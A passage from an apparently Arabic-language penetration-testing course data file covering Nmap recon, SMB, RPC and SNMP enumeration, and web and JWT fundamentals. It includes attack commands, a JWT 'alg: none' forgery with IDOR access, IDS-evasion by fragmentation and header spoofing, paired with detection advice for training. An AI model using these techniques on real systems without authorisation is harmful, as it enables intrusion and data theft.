      { id: 'c6_4', text: 'إنشاء Snapshot أساسي نظيف للماكينة بعد اكتمال التجهيز.' }
    ],
    officialResources: [
      { name: 'Kali Linux Official Documentation', url: 'https://www.kali.org/docs/', type: 'Documentation' },
      { name: 'Kali Tools Directory (Complete manual)', url: 'https://www.kali.org/tools/', type: 'Tools' }
    ]
  },

  {
    id: 7,
    zoneId: 'zone-recon',
    titleAr: 'المرحلة 7: الاستطلاع وجمع المعلومات وفحص الشبكات (Recon & Network Auditing)',
    titleEn: 'Stage 7: Passive & Active Recon, Nmap Mastery & Service Enumeration (eJPTv2)',
    tag: 'Reconnaissance',
    difficulty: 'متوسط إلى متقدم',
    xpReward: 400,
    position: { x: -5, y: 0, z: -10 },
    brief: 'العمود الفقري لامتحان eJPTv2 والعمليات الميدانية: الاستطلاع السلبي (OSINT)، الاستطلاع النشط عبر Nmap واحتراف الـ Flags وسكربتات NSE، واستطلاع الخدمات الحساسة: مشاركات ويندوز SMB، استجواب RPC، فحص مجتمعات SNMP، وتحديد إصدارات الخدمات بدقة جراحية.',
    whyLearn: 'الاستطلاع يمثل 70% إلى 80% من نجاح أي عملية اختبار اختراق! المهاجم المحترف لا يقفز لتجربة الثغرات عميانياً؛ بل يجمع كل معلومة عن التقنيات المستخدمة ونظام التشغيل والمنافذ المفتوحة ليختار الضربة الدقيقة المناسبة دون إحداث ضجيج أو فشل.',
    professionalApplication: 'يستخدمه مختبر الاختراق في تحديد سطح الهجوم (Attack Surface)، كشف الخوادم المنسية التي لا تخضع للرقابة داخل الشركات، والعثور على بورتات الإدارة الحساسة (SMB 445, RPC 135, SNMP 161, RDP 3389, Modbus 502) المعرضة للشبكة.',
    caseStudy: 'اختراق شركة Equifax الضخم (2017)؛ حيث بدأ باكتشاف خادم ويب منسي يعمل بنسخة قديمة غير مرقعة من Apache Struts عبر فحص خارجي، مما أدى لتسريب بيانات أكثر من 147 مليون مواطن.',
    commonMistakes: [
      'تشغيل Nmap بأوامر هجومية صاخبة وبسرعة T5 ضد جدران نارية حديثة، مما يؤدي لحظر عنوان الـ IP الخاص بك فوراً وتشويه نتائج الفحص.',
      'الاعتماد فقط على المنافذ الافتراضية الـ 1000 الأولى وتجاهل فحص كامل المنافذ الـ 65535 عبر الخيار `-p-`، مما قد يجعلك تفوت خدمات سرية تعمل على بورتات عليا.',
      'تجاهل استطلاع خدمات الـ SMB والـ RPC عند اكتشاف منافذ مفتوحة، والقفز مباشرة لتجربة أدوات الاستغلال.'
    ],
    detailedGuide: `
### 1. منهجية الفحص الشامل في eJPTv2 (Nmap Scan Strategy)
1. **الفحص السريع الأولي (Initial Discovery):** فحص المنافذ الأكثر شيوعاً لاكتشاف الخدمات السريعة وبدء تحليلها فوراً.
2. **الفحص الشامل لجميع المنافذ (\`-p-\`):** تشغيله في الخلفية للتأكد من عدم تفويت أي خدمة تعمل على بورت عالي (مثل 8080 أو 8443 أو 9001).
3. **فحص الخدمات والإصدارات والسكربتات (\`-sV -sC\`):** استجواب كل منفذ مفتوح للتعرف على اسم البرنامج وإصداره بدقة.

### 2. أهم Flags في أداة Nmap يجب حفظها
* \`-sS\` (TCP SYN Stealth Scan): الفحص الشبح الذي لا يكمل المصافحة الثلاثية ويقلل التسجيل في السجلات.
* \`-sV\` (Version Detection): استجواب المنافذ لتحديد إصدارات الخدمات بدقة.
* \`-sC\` (Default Scripts): تشغيل سكربتات محرك NSE الأساسية المأمونة.
* \`-p-\` (All Ports): فحص كامل المنافذ الـ 65535.
* \`-T4\` (Aggressive Timing): ضبط السرعة المناسبة لمعامل التدريب وشبكات اللابات السريعة.
* \`-oA <name>\` (Output All Formats): حفظ النتائج في 3 ملفات (ملف نصي .nmap، وملف قابل للبحث بـ grep .gnmap، وملف XML .xml).

### 3. استطلاع الخدمات المتقدم (Host & Service Auditing)
* **خدمة مشاركة الملفات (SMB - Port 445/139):**
  * استخدام \`smbclient -L //target/ -N\` لفحص المشاركات المفتوحة بدون كلمة سر (Null Sessions).
  * استخدام \`enum4linux -a target\` لاستخراج أسماء المستخدمين والمجموعات وسياسات كلمات السر.
* **خدمة نداء الإجراء البعيد (RPC - Port 135/111):**
  * استخدام \`rpcclient -U "" -N target\` للاتصال كمستخدم مجهول واستخراج بيانات المستخدمين عبر \`enumdomusers\`.
* **بروتوكول إدارة الشبكة (SNMP - UDP Port 161):**
  * بروتوكول يرسل معلومات تفصيلية عن العمليات وكروت الشبكة والبرامج المثبتة إذا كانت كلمة السر المجتمعية (Community String) هي \`public\`.
    `,
    practicalSteps: [
      {
        step: 1,
        title: 'الفحص المنهجي الشامل للأهداف بـ Nmap مع حفظ النتائج',
        desc: 'الأمر المعتمد عالمياً في اختبارات eJPTv2 و OSCP لكشف جميع المنافذ والإصدارات وتشغيل السكربتات.',
        command: 'nmap -sV -sC -p- -T4 -oA initial_recon_scan 10.10.10.50',
        flags: [
          { flag: '-sV', explanation: 'التعرف على إصدارات الخدمات العاملة بدقة' },
          { flag: '-sC', explanation: 'تشغيل حزمة السكربتات الافتراضية لاكتشاف الثغرات الشائعة' },
          { flag: '-p-', explanation: 'فحص جميع المنافذ الـ 65535 دون استثناء' },
          { flag: '-T4', explanation: 'تسريع وتيرة الفحص لشبكات اللابات' },
          { flag: '-oA', explanation: 'تصدير التقارير بجميع الصيغ النصية والـ XML' }
        ],
        expectedOutput: `Starting Nmap 7.94 ( https://nmap.org ) at 2026-09-29 18:30 EDT
Nmap scan report for 10.10.10.50
Host is up (0.0021s latency).
Not shown: 65530 closed tcp ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
80/tcp   open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Enterprise Corp Portal
139/tcp  open  netbios-ssn Samba smbd 4.6.2
445/tcp  open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel`,
        proTip: 'في الامتحان العملي، ابدأ أولاً بفحص nmap -sC -sV target لأسرع 1000 منفذ لتبدأ تحليل نتائج الويب أو SSH فوراً في الدقائق الأولى بينما يستمر الفحص الشامل -p- في العمل بالخلفية.'
      },
      {
        step: 2,
        title: 'استطلاع وفحص مشاركات ويندوز SMB بدون كلمة سر (Null Session)',
        desc: 'فحص ما إذا كان خادم SMB يسمح بقراءة المجلدات والمشاركات كضيف مجهول (Anonymous Guest Access).',
        command: 'smbclient -L //10.10.10.50/ -N && nmap -p 445 --script smb-enum-shares,smb-enum-users 10.10.10.50',
        flags: [
          { flag: '-L', explanation: 'عرض قائمة المجلدات المشتركة على السيرفر (List Shares)' },
          { flag: '-N', explanation: 'الاتصال بدون كلمة سر (No Password / Null Session)' },
          { flag: '--script smb-enum*', explanation: 'تشغيل سكربتات Nmap لاستخراج أسماء المستخدمين والصلاحيات' }
        ],
        expectedOutput: `        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        public          Disk      Public Department Files (Read/Write)
        IPC$            IPC       IPC Service (Samba 4.6.2)
SMB Anonymous login successful: true`,
        proTip: 'إذا وجدت مشاركة عامة مثل public متاحة بدون كلمة سر، ادخل عليها فوراً عبر: smbclient //target/public -N وابحث عن ملفات التكوين (.config, .bak, passwords.txt).'
      },
      {
        step: 3,
        title: 'استكشاف مجتمعات الـ SNMP واستخراج العمليات المثبتة',
        desc: 'استجواب خادم SNMP على منفذ UDP 161 لاكتشاف معلومات تفصيلية عن العمليات ومستخدمي النظام.',
        command: 'snmpwalk -v2c -c public 10.10.10.50 hrSWRunName',
        flags: [
          { flag: '-v2c', explanation: 'استخدام بروتوكول SNMP الإصدار 2c الأكثر شيوعاً' },
          { flag: '-c public', explanation: 'اسم المجتمع الافتراضي الأكثر شيوعاً وإهمالاً من مسؤولي الشبكات' },
          { flag: 'hrSWRunName', explanation: 'شجرة MIB الخاصة بقراءة أسماء العمليات المشغلة حالياً في الذاكرة' }
        ],
        expectedOutput: `HOST-RESOURCES-MIB::hrSWRunName.1 = STRING: "systemd"
HOST-RESOURCES-MIB::hrSWRunName.650 = STRING: "sshd"
HOST-RESOURCES-MIB::hrSWRunName.820 = STRING: "apache2"
HOST-RESOURCES-MIB::hrSWRunName.1150 = STRING: "mysqld"`,
        proTip: 'في بيئات الشركات واختبار eJPTv2، كشف SNMP للعمليات يخبرك فوراً إذا كان هناك خادم قواعد بيانات أو خدمة داخلية تعمل خلف فايروول لا يمكنك الوصول إليه مباشرة.'
      }
    ],
    youtubeVideos: [
      {
        title: 'Nmap for Ethical Hackers (Master Class Walkthrough)',
        channel: 'NetworkChuck',
        duration: '32 دقيقة',
        url: 'https://www.youtube.com/watch?v=4t4kBkMsDbQ',
        keyTakeaway: 'شرح كل خيارات وFlags أداة Nmap وكيفية التعامل مع الفايروول وتفسير النتائج.'
      },
      {
        title: 'Scanning and Enumeration (Nmap, SMB, RPC, Enum4linux)',
        channel: 'John Hammond',
        duration: '42 دقيقة',
        url: 'https://www.youtube.com/watch?v=7uV8hG8f5fA',
        keyTakeaway: 'تطبيق عملي كامل على استطلاع أجهزة الشبكة وخدمات المشاركة والـ RPC خطوة بخطوة.'
      },
      {
        title: 'Practical Ethical Hacking - Information Gathering & Recon',
        channel: 'The Cyber Mentor',
        duration: '50 دقيقة',
        url: 'https://www.youtube.com/watch?v=3Kq1MIfTWCE',
        keyTakeaway: 'منهجية الاستطلاع الميداني والـ OSINT وفحص الثغرات الحقيقي في الشركات.'
      }
    ],
    tryHackMeRooms: [
      { name: 'Nmap Basics & Advanced', url: 'https://tryhackme.com/r/room/furthernmap', difficulty: 'Easy to Medium', whyMatters: 'شرح تفصيلي شامل لكل Flags أداة Nmap وكيفية التعامل مع الفايروول.' },
      { name: 'Network Services (SMB, Telnet, FTP)', url: 'https://tryhackme.com/r/room/networkservices', difficulty: 'Easy', whyMatters: 'التدريب العملي الأساسي لاختبار eJPTv2 على خدمات المشاركة والملفات.' },
      { name: 'Network Services 2 (NFS, SMTP, MySQL)', url: 'https://tryhackme.com/r/room/networkservices2', difficulty: 'Medium', whyMatters: 'استطلاع قواعد البيانات ومشاركات ملفات NFS واستخراج بياناتها.' }
    ],
    writeup: {
      title: 'استطلاع شبكي شامل وكشف خدمات SMB و SNMP غير المحمية (Network Recon & Enumeration Engagement)',
      scenario: 'عملية استطلاع حقيقية على شبكة بنية تحتية: بدء الفحص بـ Nmap لتحديد المنافذ الحساسة، واكتشاف خادم ملفات SMB يتيح الدخول كمجهول (Null Session / Anonymous Login)، واستجواب خدمة SNMP بمجتمعات افتراضية لاستخراج قائمة العمليات ومستخدمي النظام دون إطلاق إنذارات صاخبة.',
      steps: [
        {
          phase: 'Phase 01: Stealth SYN Scanning & Service Versioning',
          title: 'فحص المنافذ الصامت وتحديد إصدارات الخدمات بدقة',
          action: 'تم تنفيذ فحص نصف مفتوح عبر أمر: nmap -sS -sV -p- -T4 --open 10.10.10.50؛ حيث تم إرسال حزم SYN فقط دون إكمال الـ 3-Way Handshake (RST بعد SYN-ACK) لتقليل تسجيل الاتصال في سجلات التطبيقات وكشف الخدمات المخفية على البورتات العليا.',
          detection: 'تسجل أنظمة كشف التسلل (Snort/Suricata Rule SID: 2001219) محاولات الـ SYN Scan برصد تكرار حزم SYN المتتالية على منافذ مختلفة من عنوان IP واحد دون إكمال الاتصال.',
          mitreId: 'T1046',
          link: 'https://nmap.org/book/man-port-scanning-techniques.html',
          linkText: 'التوثيق الرسمي لتقنيات فحص المنافذ المختلفة في أداة Nmap'
        },
        {
          phase: 'Phase 02: SMB Anonymous Enumeration & Share Crawling',
          title: 'استطلاع مشاركات ويندوز SMB عبر جلسات Null Session',
          action: 'باستخدام أداة smbclient -L //10.10.10.50/ -N، تم الدخول بدون اسم مستخدم أو كلمة مرور (Anonymous Login) واكتشاف مجلد مشاركة مفتوح باسم public يحتوي على ملفات نسخ احتياطي (.bak) ومستندات تكوين سرية.',
          detection: 'تسجل خوادم ويندوز أحداث الأمان Windows Security Event ID 4624 (Logon Type 3: Network) مع اسم الحساب ANONYMOUS LOGON، وهو مؤشر رصد حاسم لفرق الـ Blue Team.',
          mitreId: 'T1021.002',
          link: 'https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb',
          linkText: 'دليل HackTricks الشامل لاستطلاع واستغلال خدمات مشاركة الملفات SMB'
        },
        {
          phase: 'Phase 03: SNMP MIB Walking & Process Table Extraction',
          title: 'استجواب شجرة SNMP واستخراج العمليات الحية بالذاكرة',
          action: 'باستخدام snmpwalk -v2c -c public 10.10.10.50 hrSWRunName، تم استجواب شجرة الـ MIB واكتشاف أسماء العمليات المشغلة في الخلفية (مثل mysqld و apache2 و sshd) دون الحاجة لامتلاك شل على النظام.',
          detection: 'ترصد جدران الحماية تدفق طلبات SNMP GET/GET-NEXT المكثفة على منفذ UDP 161 الواردة من مصادر خارجية خارج نطاق خوادم المراقبة المعتمدة (NMS).',
          mitreId: 'T1082',
          link: 'https://attack.mitre.org/techniques/T1082/',
          linkText: 'توثيق تقنيات استكشاف معلومات النظام عبر بروتوكولات الإدارة في MITRE ATT&CK'
        },
        {
          phase: 'Phase 04: Vulnerability Correlation & Attack Surface Mapping',
          title: 'مطابقة الإصدارات المكتشفة مع ثغرات CVE المعروفة',
          action: 'باستخدام سكربتات Nmap Scripting Engine: nmap -p 445 --script vuln 10.10.10.50، تم فحص ثغرات الـ SMB المعروفة وتأكيد عدم وجود ثغرات حرجة مثل EternalBlue، مما وجه جهد الفريق للتركيز على ثغرات الويب والتطبيقات.',
          detection: 'ترصد أنظمة الـ SIEM محاولات اختبار الثغرات المعروفة عبر التوقيعات (Signature-based Alerts) لـ NSE Scripts.',
          mitreId: 'T1595.002',
          link: 'https://nmap.org/nsedoc/categories/vuln.html',
          linkText: 'مكتبة سكربتات NSE لفحص وكشف الثغرات الأمنية في Nmap'
        }
      ],
      lessonLearned: 'ترك خدمات البنية التحتية مثل SMB و SNMP بإعداداتها الافتراضية ومجتمعات public يمنح المهاجم خريطة كاملة للشبكة دون الحاجة لأي هجوم معقد. يجب تعطيل بروتوكول SMBv1، وحظر تسجيل الدخول كمجهول (RestrictAnonymous=1)، والترقية لـ SNMPv3 المشفر بكلمات مرور قوية.'
    },
    secretTradecraft: [
      {
        title: 'تقنيات التخفي من أنظمة كشف التسلل بتجزئة الحزم وتعديل الـ MTU (Nmap Packet Fragmentation)',
        mitreId: 'T1036',
        category: 'Firewall & IDS Evasion',
        explanation: 'عبر استخدام خيار -f أو --mtu 16 في Nmap، يتم تقسيم ترويسة TCP إلى أجزاء صغيرة تتوزع على عدة حزم IP. تنهار بعض أنظمة جدران الحماية القديمة أو الـ Stateless Firewalls في إعادة تجميع الحزم بالسرعة الكافية، مما يسمح للفحص بالمرور دون تسجيل إنذار في شاشات المراقبة.',
        detection: 'تتصدى أنظمة الـ Next-Gen IDS (مثل Zeek و Suricata) لهذه الحيلة عبر تفعيل خاصية TCP Reassembly المتقدمة التي تعيد بناء الحزم بالكامل قبل اتخاذ قرار التمرير.',
        link: 'https://nmap.org/book/man-bypass-firewalls-ids.html',
        linkText: 'دليل Nmap لتجاوز الجدران النارية وأنظمة كشف التسلل بالتقنيات المتقدمة'
      },
      {
        title: 'استجواب خوادم RPC بصمت عبر rpcclient Null Sessions (Silent RPC Enumeration)',
        mitreId: 'T1069.002',
        category: 'Domain & User Discovery',
        explanation: 'عبر تنفيذ أمر: rpcclient -U "" -N 10.10.10.50، واستدعاء أوامر مثل enumdomusers و queryuser، يمكن استخراج القائمة الكاملة لأسماء مستخدمي الدومين، ومجموعات الصلاحيات، وسياسة كلمات المرور (Password Policy) دون الحاجة لإنشاء جلسة مصادقة مسجلة.',
        detection: 'ترصد سجلات ويندوز استدعاءات بروتوكول MS-SAMR عبر شبكة الاتصال، وتوصي مايكروسوفت بتقييد الوصول لـ SAMR عبر سياسات RestrictRemoteSAM.',
        link: 'https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html',
        linkText: 'توثيق أداة rpcclient لاستجواب وإدارة خدمات MS-RPC'
      },
      {
        title: 'فحص الشبكات فائقة السرعة بدون حالة عبر Masscan و RustScan (Stateless Mass Scanning)',
        mitreId: 'T1046',
        category: 'High-Speed Reconnaissance',
        explanation: 'تعتمد أدوات مثل Masscan و RustScan على معمارية عدم حفظ الحالة (Stateless TCP SYN Scan)، مما يمكنها من فحص كامل نطاق الإنترنت (4 مليار عنوان) في دقائق معدودة بإرسال حزم SYN متوازية بملايين الحزم في الثانية واستقبال الردود عبر حلقة استقبال غير متزامنة منفصلة.',
        detection: 'ترصد أنظمة الحماية ومراقبة الـ ISP هذه الفحوصات فورياً بسبب الارتفاع الهائل في كثافة حزم الـ SYN الصادرة (SYN Flood / Spike Anomaly).',
        link: 'https://github.com/robertdavidgraham/masscan',
        linkText: 'مستودع أداة Masscan الشهيرة للفحص فائق السرعة للشبكات الكبرى'
      }
    ],
    checklist: [
      { id: 'c7_1', text: 'إتقان الفرق بين الاستطلاع السلبي (OSINT) والاستطلاع النشط (Active Scan).' },
      { id: 'c7_2', text: 'فهم ميكانيكية عمل Nmap Flags (-sS, -sV, -sC, -p-, -T4, -oA).' },
      { id: 'c7_3', text: 'القدرة على استطلاع خدمات SMB والـ RPC واستخراج أسماء المستخدمين والمشاركات.' },
      { id: 'c7_4', text: 'فحص مجتمعات SNMP عبر snmpwalk واستخراج العمليات الحية في النظام.' }
    ],
    officialResources: [
      { name: 'Nmap Official Reference Guide (Fyodor)', url: 'https://nmap.org/book/man.html', type: 'Documentation' },
      { name: 'Samba smbclient Manual Page', url: 'https://www.samba.org/samba/docs/current/man-html/smbclient.1.html', type: 'Documentation' },
      { name: 'NetExec (The modern CrackMapExec successor)', url: 'https://www.netexec.org', type: 'Tools' }
    ]
  },

  {
    id: 8,
    zoneId: 'zone-web',
    titleAr: 'المرحلة 8: أساسيات معمارية وتطبيقات الويب (Web Fundamentals & HTTP Architecture)',
    titleEn: 'Stage 8: Web Applications Architecture, HTTP/HTTPS Protocol & REST APIs',
    tag: 'Web Security',
    difficulty: 'متوسط',
    xpReward: 400,
    position: { x: 10, y: 0, z: -15 },
    brief: 'فهم كيف يعمل الويب خلف الكواليس: بروتوكول HTTP/1.1 و HTTP/2، أفعال الطلب (GET, POST, PUT, DELETE)، ترويسات الأمان (Headers)، إدارة الجلسات (Sessions, Cookies, JWT Tokens)، والواجهات البرمجية (RESTful APIs).',
    whyLearn: 'أكثر من 80% من الثغرات المكتشفة اليوم تقع في تطبيقات الويب وواجهات الـ API. لا يمكنك اختبار أمان تطبيق ويب وأنت لا تفهم كيف يتواصل المتصفح مع الخادم، أو كيف تُحفظ بيانات الدخول في الكوكيز والرموز المميزة.',
    professionalApplication: 'يستخدمه مهندس فحص أمان التطبيقات (AppSec / Pentester) في تحليل حركة مرور الطلبات، اكتشاف ضعف إدارة الجلسات، التلاعب بالمدخلات في الـ Headers، واستخراج البيانات المخفية.',
    caseStudy: 'ثغرة T-Mobile الشهيرة (2021) التي تمت عبر استغلال مسارات غير مؤمنة في واجهة API خادم التوجيه دون وجود تحقق كافٍ من الصلاحيات (Lack of Authentication)، مما كشف بيانات ملايين المستخدمين.',
    commonMistakes: [
      'الاعتماد على قيود الحقول من جهة العميل (Client-Side Validation مثل JavaScript أو كود HTML) وافتراض أنها تحمي الموقع، بينما يمكن للمهاجم تجاوزها بتعطيل الجافاسكربت أو عبر أداة اعتراض الطلبات.',
      'تجاهل خصائص الأمان في الكوكيز مثل: `HttpOnly` (لمنع سرقة الكوكيز بالـ XSS) و `Secure` و `SameSite`.'
    ],
    detailedGuide: `
### 1. تشريح طلب واستجابة الـ HTTP
* **طلب العميل (HTTP Request):**
  * سطر الطلب: الطريقة (Method) والمسار (Path) والإصدار (\`POST /api/v1/login HTTP/1.1\`).
  * الترويسات (Headers): مثل \`Host\`, \`User-Agent\`, \`Content-Type\`, \`Authorization: Bearer <token>\`.
  * جسم الطلب (Body): البيانات المرسلة (مثل بيانات JSON أو Form Data).
* **استجابة الخادم (HTTP Response):**
  * كود الحالة (Status Code): 200 OK (نجاح)، 302 Redirect (إعادة توجيه)، 401 Unauthorized (غير مصرح)، 403 Forbidden (محظور)، 500 Internal Error (خطأ خادم).

### 2. مصادقة الـ JWT (JSON Web Tokens)
يتكون رمز الـ JWT من 3 أجزاء مفصولة بنقاط: \`Header.Payload.Signature\`
* **Header:** يحدد خوارزمية التوقيع (مثل HS256).
* **Payload:** يحمل بيانات المستخدم (Claims) مثل \`user_id\` و \`role\`.
* **Signature:** التوقيع الرقمي لمنع التلاعب.
* الثغرات الشائعة: ثغرة الـ \`None Algorithm\`، أو التخمين على المفتاح السري الضعيف (Secret Key Brute-Force).

### 3. أمن الواجهات البرمجية (REST API Security)
الـ APIs تعتمد على تبادل بيانات JSON، وتتطلب فحصاً دقيقاً لآليات التحقق من الهوية (Authentication) ومنع التلاعب بمعرفات الكائنات (BOLA / IDOR).
    `,
    practicalSteps: [
      {
        step: 1,
        title: 'استكشاف مسارات ومجلدات الويب المخفية عبر Gobuster (eJPT Core)',
        desc: 'أداة الفحص والتخمين القياسية لاكتشاف الملفات ولوحات التحكم السرية في خوادم الويب.',
        command: 'gobuster dir -u http://10.10.10.50/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak -t 25 -o gobuster_results.txt',
        flags: [
          { flag: 'dir', explanation: 'وضع فحص الدلائل والمسارات' },
          { flag: '-u', explanation: 'رابط الخادم المستهدف' },
          { flag: '-w', explanation: 'قاموس التخمين المستخدم' },
          { flag: '-x', explanation: 'امتدادات الملفات المراد فحصها (php, txt, html, bak)' },
          { flag: '-t 25', explanation: 'تشغيل 25 خيط متوازي (Threads) لتسريع الفحص' }
        ],
        expectedOutput: `===============================================================
Gobuster v3.6 - Directory & File Enumeration
===============================================================
[+] Url:                     http://10.10.10.50/
[+] Method:                  GET
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
===============================================================
/admin                (Status: 301) [Size: 178] [--> /admin/]
/config.php.bak       (Status: 200) [Size: 1420]
/login.php            (Status: 200) [Size: 3200]
/robots.txt           (Status: 200) [Size: 45]`,
        proTip: 'ملفات النسخ الاحتياطية مثل .bak أو .old غالباً ما يتركها المطورون سهواً، وتكشف أحياناً كلمات سر قواعد البيانات ومفاتيح API مباشرة بنص صريح!'
      },
      {
        step: 2,
        title: 'إرسال طلبات الـ HTTP المخصصة وفحص الترويسات عبر cURL',
        desc: 'أداة سطر الأوامر الأقوى لاختبار استجابة السيرفر وتفقد ترويسات الأمان والكوكيز.',
        command: 'curl -i -s -X GET http://10.10.10.50/login.php | head -n 15',
        flags: [
          { flag: '-i', explanation: 'عرض ترويسات الـ HTTP Response كاملة مع كود الحالة' },
          { flag: '-s', explanation: 'الوضع الصامت لإخفاء شريط تقدم التحميل' },
          { flag: '-X GET', explanation: 'تحديد طريقة الطلب (GET Method)' }
        ],
        expectedOutput: `HTTP/1.1 200 OK
Date: Tue, 29 Sep 2026 18:35:10 GMT
Server: Apache/2.4.41 (Ubuntu)
Set-Cookie: PHPSESSID=d9a8fbc839201948; path=/; HttpOnly
X-Frame-Options: SAMEORIGIN
Content-Type: text/html; charset=UTF-8`,
        proTip: 'افحص دائماً كوكيز الـ Set-Cookie: إذا لم تجد خاصية HttpOnly، فهذا يعني أن الجلسة معرضة للسرقة الفورية في حال وجود أي ثغرة XSS بالموقع!'
      }
    ],
    youtubeVideos: [
      {
        title: 'HTTP and Web Fundamentals for Ethical Hackers',
        channel: 'NetworkChuck',
        duration: '24 دقيقة',
        url: 'https://www.youtube.com/watch?v=sWbGOq-IrN4',
        keyTakeaway: 'شرح كامل لكيفية عمل المتصفحات وطلبات الـ HTTP وأكواد الاستجابة والـ Headers.'
      },
      {
        title: 'REST API Security & Testing for Beginners',
        channel: 'The Cyber Mentor',
        duration: '30 دقيقة',
        url: 'https://www.youtube.com/watch?v=3Kq1MIfTWCE',
        keyTakeaway: 'فهم الواجهات البرمجية وتمرير التوكنز وفحص ثغرات المصادقة في تطبيقات الويب.'
      }
    ],
    tryHackMeRooms: [
      { name: 'Web Fundamentals Module', url: 'https://tryhackme.com/r/module/web-fundamentals', difficulty: 'Easy', whyMatters: 'تأسيس شامل في HTTP, Requests, Responses, Cookies, Web Servers.' },
      { name: 'How The Web Works', url: 'https://tryhackme.com/r/room/howthewebworks', difficulty: 'Easy', whyMatters: 'يشرح كيف تترابط خدمات الـ DNS مع السيرفر والمتصفح.' }
    ],
    writeup: {
      title: 'تدقيق أمان واجهات RESTful APIs وتلاعب رموز المصادقة JWT (Web Architecture & API Security Audit)',
      scenario: 'تدقيق أمني على تطبيق ويب مصرفي حديث يعتمد على Single Page Application و REST APIs: اعتراض حركة الطلبات عبر Burp Suite، تحليل رموز مصادقة الـ JWT، واكتشاف ثغرة تزوير الصلاحيات عبر هجوم None Algorithm وتجاوز التحقق من المعرفات.',
      steps: [
        {
          phase: 'Phase 01: API Endpoint Discovery & Content Routing',
          title: 'اكتشاف مسارات واجهات الـ REST API المخفية',
          action: 'باستخدام أداة gobuster dir مع قاموس مسارات الـ APIs: gobuster dir -u http://10.10.10.50/ -w /usr/share/seclists/Discovery/Web-Content/common-api-endpoints.txt، تم اكتشاف مسار إدارة المستخدمين الداخلي: /api/v1/users/profile.',
          detection: 'تسجل أنظمة إدارة الـ API Gateways (مثل Kong أو AWS API Gateway) طلبات متكررة بمعدل شاذ وغير مصحوبة برمز API-Key معتمد.',
          mitreId: 'T1595',
          link: 'https://owasp.org/www-project-api-security/',
          linkText: 'مشروع OWASP الرسمي لأمان واجهات برمجة التطبيقات (API Security Top 10)'
        },
        {
          phase: 'Phase 02: HTTP Request Inspection & Header Manipulation',
          title: 'اعتراض طلبات المصادقة وتحليل بنية رمز JWT',
          action: 'تم اعتراض طلب تسجيل الدخول عبر Burp Suite Proxy وفحص ترويسة Authorization: Bearer <token>. بفك تشفير الرمز بتنسيق Base64، تبين أنه يحمل حقول {"alg": "HS256", "typ": "JWT"} وحقل البيانات {"user_id": 105, "role": "user"}.',
          detection: 'ترصد أنظمة الـ WAF وجود تعديلات أو طلبات غير قياسية في حقول ترويسات الـ Authorization الواردة.',
          mitreId: 'T1071.001',
          link: 'https://portswigger.net/web-security/jwt',
          linkText: 'معمل ودليل أكاديمية PortSwigger الشامل لثغرات الـ JWT وطرق استغلالها'
        },
        {
          phase: 'Phase 03: JWT Algorithm Confusion & Signature Tampering',
          title: 'تغيير خوارزمية التوقيع إلى None وتزوير الصلاحيات',
          action: 'تم تعديل الـ Header إلى {"alg": "none", "typ": "JWT"} وتغيير قيمة الـ role إلى admin وحذف جزء التوقيع النهائي، وإعادة إرسال الطلب؛ فقبل الخادم الرمز بدون تحقق من التوقيع ومنح الجلسة صلاحيات المسؤول الكاملة.',
          detection: 'تسجل مكتبات التحقق من الـ JWT في الخادم تنبيهات أمنية حرجة عند استلام رموز تحمل alg: none ويجب برمجتها لرفضها فوراً وإسقاط الاتصال.',
          mitreId: 'T1552',
          link: 'https://jwt.io/',
          linkText: 'موقع ومنصة فحص وفك رموز الـ JSON Web Tokens الرسمية'
        },
        {
          phase: 'Phase 04: Broken Object-Level Authorization Verification',
          title: 'إثبات ثغرة تلاعب معرفات الكائنات (BOLA / IDOR)',
          action: 'بصلاحيات الرمز المزور، تم استدعاء المسار: /api/v1/users/1/financial_records وعرض السجلات المالية لحساب المدير العام دون أي تحقق في الخادم من ملكية الكائن المطلوب.',
          detection: 'ترصد سجلات التطبيق الوصول لحسابات مستخدمين متعددين من جلسة واحدة (Session Hopping) وتطلق تنبيهاً أمنياً بالـ SIEM.',
          mitreId: 'T1068',
          link: 'https://cwe.mitre.org/data/definitions/639.html',
          linkText: 'توثيق CWE-639 الرسمي لثغرات التلاعب بالمعرفات وتخطي التحقق (IDOR)'
        }
      ],
      lessonLearned: 'لا يمكن الثقة في أي قيمة واردة من العميل؛ يجب على الخادم التحقق الصارم من توقيع رموز الـ JWT وحظر خوارزمية none نهائياً، وفرض فحص التحقق من الصلاحيات (Authorization Check) على كل كائن مطلوب في قاعدة البيانات.'
    },
    secretTradecraft: [
      {
        title: 'كشف مسارات الـ API المخفية عبر ملفات JavaScript Source Maps (Source Code Reconstruction)',
        mitreId: 'T1592.004',
        category: 'Client-Side Reconnaissance',
        explanation: 'عند بناء تطبيقات React/Vue، يترك المطورون ملفات الـ Source Maps (.js.map) مفعلة في الإنتاج عن طريق الخطأ. يمكن للمهاجم استرجاع الكود المصدري الأصلي للتطبيق بالكامل، وقراءة جميع مسارات الـ API غير الموثقة، وأحياناً مفاتيح التشفير والمصادقة المتروكة داخل الكود.',
        detection: 'تقوم فرق أمن التطبيقات بفحص إعدادات الـ Webpack / Vite والتأكد من ضبط productionSourceMap: false قبل نشر التطبيق في بيئة الإنتاج.',
        link: 'https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/source-maps',
        linkText: 'دليل HackTricks لاستخراج الكود المصدري واكتشاف الثغرات عبر ملفات Source Maps'
      },
      {
        title: 'التلاعب برؤوس البروكسي لتجاوز قيود الدخول (HTTP Header Spoofing: X-Forwarded-For)',
        mitreId: 'T1090',
        category: 'Access Control Evasion',
        explanation: 'عندما تحظر لوحات تحكم الخادم الدخول إلا من الـ Localhost (127.0.0.1)، يتم إرسال طلبات مخصصة تحتوي على ترويسات مثل: X-Forwarded-For: 127.0.0.1 أو X-Originating-IP: 127.0.0.1؛ فإذا كان الخادم يعتمد على هذه الترويسات للتحقق بدلاً من عنوان المقبس الحقيقي، فإنه يمنح المهاجم وصولاً إدارياً كاملاً.',
